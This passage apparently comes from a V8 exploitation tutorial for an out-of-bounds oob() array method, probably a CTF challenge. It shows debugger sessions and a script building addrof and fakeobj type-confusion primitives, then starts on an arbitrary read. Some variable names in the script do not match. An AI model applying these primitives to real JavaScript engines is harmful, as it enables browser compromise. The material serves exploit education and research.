</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0d00</span><span class="o">:</span>	<span class="mh">0x0000332786dc2f79</span>	<span class="mh">0x00003882de940c71</span>   <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd0d10</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd0c61</span>	<span class="mh">0x0000000300000000</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">24</span><span class="n">xg</span> <span class="mh">0x0000176d4ccd0c61</span><span class="o">-</span><span class="mi">1</span>                      <span class="c1">// Elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd0c60</span><span class="o">:</span>	<span class="mh">0x00003882de940851</span>	<span class="mh">0x0000000300000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0c70</span><span class="o">:</span>	<span class="mh">0x0000291e539227d1</span>	<span class="mh">0x0000000300000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0c80</span><span class="o">:</span>	<span class="mh">0x00003882de944349</span>	<span class="mh">0x00003882de940851</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                                          ^--- return of a.oob()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd0c90</span><span class="o">:</span>	<span class="mh">0x0000000400000000</span>	<span class="mh">0x000009a078f03b29</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0ca0</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd0c21</span>	<span class="mh">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0cb0</span><span class="o">:</span>	<span class="mh">0xffffffff00000000</span>	<span class="mh">0x00003882de9412c9</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0cc0</span><span class="o">:</span>	<span class="mh">0x0000000100000000</span>	<span class="mh">0x0000040000000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0cd0</span><span class="o">:</span>	<span class="mh">0x00003882de941279</span>	<span class="mh">0x0000000400000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0ce0</span><span class="o">:</span>	<span class="mh">0x0000000200000000</span>	<span class="mh">0x0000291e539173e9</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0cf0</span><span class="o">:</span>	<span class="mh">0x0000291e53922949</span>	<span class="mh">0x00003882de9404d1</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0d00</span><span class="o">:</span>	<span class="mh">0x0000332786dc2f79</span>	<span class="mh">0x00003882de940c71</span>   <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd0d10</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd0c61</span>	<span class="mh">0x0000000300000000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, on the other hand, we can observe that if we instead use the <code>JSArray</code> <code>b</code> with elements of kind <code>PACKED_DOUBLE_ELEMENTS</code>, we would instead read/write the map instance of our <code>JSArray</code> object itself, due to the very way these kind of elements are stored. We can observe the following in GDB, again debugging the <code>d8</code> release build:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">let</span> <span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="s">&#34;0x&#34;</span><span class="o">+</span><span class="nf">ftoi</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="nf">oob</span><span class="p">()).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;0x332786dc2ed9&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd1401</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">xg</span> <span class="mh">0x176d4ccd1401</span><span class="o">-</span><span class="mi">1</span>                              <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd1400</span><span class="o">:</span>	<span class="mh">0x0000332786dc2ed9</span>	<span class="mh">0x00003882de940c71</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd1410</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd13e1</span>	<span class="mh">0x0000000200000000</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">xg</span> <span class="mh">0x0000176d4ccd13e1</span><span class="o">-</span><span class="mi">1</span>                          <span class="c1">// Elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd13e0</span><span class="o">:</span>	<span class="mh">0x00003882de9414f9</span>	<span class="mh">0x0000000200000000</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd13f0</span><span class="o">:</span>	<span class="mh">0x3ff3333333333333</span>	<span class="mh">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd1400</span><span class="o">:</span>	<span class="mh">0x0000332786dc2ed9</span>	<span class="mh">0x00003882de940c71</span>      <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1">//                      ^--- return of b.oob()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd1410</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd13e1</span>	<span class="mh">0x0000000200000000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Therefore, we should consider using an Array of elements of kind <code>PACKED_DOUBLE_ELEMENTS</code> , as we were able to observe, in this case scenario the OOB read/write would enable us to change the map instance of our <code>JSArray</code> object. In the next section we will cover how we can abuse this for exploitation purposes. However, lets also check what happends on an array of objects:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">let</span> <span class="n">obj_tmp</span> <span class="o">=</span> <span class="p">{</span><span class="nl">a</span><span class="p">:</span> <span class="mi">1</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">let</span> <span class="n">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="n">obj_tmp</span><span class="p">,</span> <span class="n">obj_tmp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">obj_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd4811</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">obj_tmp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd2fc1</span> <span class="o">&lt;</span><span class="n">Object</span> <span class="n">map</span> <span class="o">=</span> <span class="mh">0x332786dcab39</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="s">&#34;0x&#34;</span><span class="o">+</span><span class="nf">ftoi</span><span class="p">(</span><span class="n">obj_arr</span><span class="p">.</span><span class="nf">oob</span><span class="p">()).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;0x332786dc2f79&#34;</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">xg</span> <span class="mh">0x176d4ccd4811</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd4810</span><span class="o">:</span>	<span class="mh">0x0000332786dc2f79</span>	<span class="mh">0x00003882de940c71</span>   <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd4820</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd47f1</span>	<span class="mh">0x0000000200000000</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">xg</span> <span class="mh">0x0000176d4ccd47f1</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd47f0</span><span class="o">:</span>	<span class="mh">0x00003882de940801</span>	<span class="mh">0x0000000200000000</span>   <span class="c1">// Elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd4800</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd2fc1</span>	<span class="mh">0x0000176d4ccd2fc1</span>		
</span></span><span class="line"><span class="cl"><span class="c1">//                     ^--- slot: 0			^--- slot: 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd4810</span><span class="o">:</span>	<span class="mh">0x0000332786dc2f79</span>	<span class="mh">0x00003882de940c71</span>   <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1">//                     ^--- return of obj_arr.oob()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x176d4ccd4820</span><span class="o">:</span>	<span class="mh">0x0000176d4ccd47f1</span>	<span class="mh">0x0000000200000000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can observe that on an JSArray of objects, elements layout is stored very similarly as in a <code>PACKED_DOUBLE_ELEMENTS</code> JSArray containing doubles, despite the fact that the element kind of a JSArray of objects is of <code>PACKED_ELEMENTS</code>.</p>
<h1 id="03---the-addrof-and-fakeobj-primitives">03 - The AddrOf and FakeObj Primitives</h1>
<p>We covered that thanks to the OOB read vulnerability, we can leak the map of a <code>JSArray</code> of objects and a <code>JSArray</code> of doubles. But lets remember that we also have a OOB write primitive. Could we overwrite the map of one object with another? Lets find out:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">arr_float</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">arr_float_map</span> <span class="o">=</span> <span class="n">arr_float</span><span class="p">.</span><span class="nf">oob</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">obj</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">obj</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">obj_arr</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="n">arr_float_map</span><span class="p">)</span>          <span class="c1">// overwritting JSArray of objects&#39; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                        <span class="c1">// map with the map of an JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                        <span class="c1">// of doubles
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">d8</span><span class="o">&gt;</span> <span class="n">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>                          <span class="c1">// This should have returned
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">9.907674278247e-311</span>                     <span class="c1">// an object but instead
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                        <span class="c1">// it returns a float
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">d8</span><span class="o">&gt;</span> <span class="s">&#34;0x&#34;</span><span class="o">+</span><span class="nf">ftoi</span><span class="p">(</span><span class="n">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;0x123d09290a11&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x123d09290a11</span> <span class="o">&lt;</span><span class="n">Object</span> <span class="n">map</span> <span class="o">=</span> <span class="mh">0xc8433dc0459</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can observe that if we overwrite the map of a <strong>JSArray of Objects</strong> with the map of an <strong>JSArray of doubles</strong>, the affected JSArray of objects will behave differently when elements are tried to be yield from it, returning the <code>double</code> interpretation of the object handle rather than the object handle itslef. As we can see in the example above, we were able to leak the addess of <code>obj</code> using this methodology. This is what&rsquo;s commonly known as the <code>addrof</code> primitive, abusing a type-confusion bug to leverage a memory disclousure vulnerbability.</p>
<p>Other common type-confusion primitive, is whats commonly known as <code>fakeobj</code>. Although is quite similar, it serves for a different purpose. Fakeobj in this example consists of replacing the map instance of an <strong>JSArray of doubles</strong> to the one of an <strong>JSArray of objects</strong>. This way, we can force V8 to interpret an object instance in a location where in reality it doesn&rsquo;t exist. The implications of fabricating an object on an arbitrary memory location entails that one would ultimately be able to read/write that arbitrary location by manipulating the elements of the given object. Lets illustrate this with an example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">flt_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">temp_obj</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">objt_arr</span> <span class="o">=</span> <span class="p">[</span><span class="n">temp_obj</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">objt_arr_map</span> <span class="o">=</span> <span class="n">objt_arr</span><span class="p">.</span><span class="nf">oob</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">fake_object_template</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">fake_object_template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x2824cc3d2509</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="mh">0x2824cc3d2509</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">flt_arr</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="n">objt_arr_map</span><span class="p">)</span>           <span class="c1">// Overwritting flt_arr map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">d8</span><span class="o">&gt;</span> <span class="n">let</span> <span class="n">fake_obj</span> <span class="o">=</span> <span class="n">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>           <span class="c1">// this should be a float.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">d8</span><span class="o">&gt;</span> <span class="n">fake_obj</span>                            <span class="c1">// instead is a copy of flt_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">fake_obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x2824cc3d2509</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">fake_obj</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From now on we will refer to these primitives as <code>addrof</code> and <code>fakeobj</code> and we will be supplying them to the <code>d8</code> shell with the following script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">tmp_obj</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">tmp_obj</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fl_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// oob read. leaking the Array of objects map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">obj_map</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1">// oob read. leaking the Array of doubles map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">fl_map</span> <span class="o">=</span> <span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// setting the object we want the address of as an element of obj_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// oob write. changing the map of obj_arr for the fl_arr map.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">fl_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// even though we are accesing obj_arr, the returned element will be a float
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// oob write. restoring the map of the object for the original one
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">        <span class="c1">// returning the integer representation of the leaked pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// storing the float value of an arbitrary address as an element of float_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// oob write. replacing the map of the float_arr to that of the obj_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">floar_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// even though we are accessing fl_arr, the returned element will be a tagged pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// oob write. restoring original map of fl_arr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// returning tagged pointer of arbitrary address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="04---introducing-an-arbitrary-read-primitive">04 - Introducing an Arbitrary Read Primitive</h1>
<p>Since we have the capability of knowing the address of objects, and to create an object in any arbitrary address that we wish thanks to the previous <code>addrof</code> and <code>fakeobj</code> primitives accordingly, the realization of an arbitrary read primitive is fearly straight forward:</p>
<ol>
<li>The first step is to create a fake FixedDoubleArray object via <code>fakeobj</code>. We can do this by creating a &ldquo;crafted&rdquo; array, in which its first element is a DoubleArray map. We should create our fake object on top of our crafted array <code>elements</code> object, taking into account that elements in a FixedDoubleArray will be stored <code>-0x20 bytes</code> from the actual address of the given JSArray object address.</li>
<li>Once we have created our fake object on top of our crafted array&rsquo;s elements, then we can manipulate the elements of that array, as if they were the actual properties or element pointers of our fake JSArray object.</li>
<li>We can modify <code>crafted_arr[2]</code> as to replace what would be the elements pointer of our fake object. Since we will be dereferencing the value of what would be the first element of our fake object, the dereferenced value will be the contents of <code>object's elements pointer + element offset</code>. It&rsquo;s important to mention that we have to substract to <code>crafted_arr[2]</code> the offset from the initial address of the JSArray object to its first element, in this case <code>0x10</code>. This is becuase the usual structure of the FixedDoubleArray object holding the elements of a given JSObject, would be the following:
<ul>
<li>offset 0: FixedDoubleArray map</li>
<li>offset 8: Number of elements is Smi notation</li>
<li>offset 16: First element</li>
<li>offset 24: Second element</li>
<li>&hellip; and so on
Therefore, when v8 tries to access the first element of an JSarray object, it will retrieve the elements pointer from the JSArray object, and will add to it the offset of the first element (in this case 0x10).</li>
</ul>
</li>
<li>As mentioned previously, when we retrieve the contents of <code>fake[0]</code>, it will dereference its element pointer, and since the object is of type FixedDoubleArray (as estipulated by its object map at <code>crafted_arr[0]</code>) it will return a float representation of the derefenced value.</li>
</ol>
<p>We can see this ilustrated in the following d8/gdb session:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
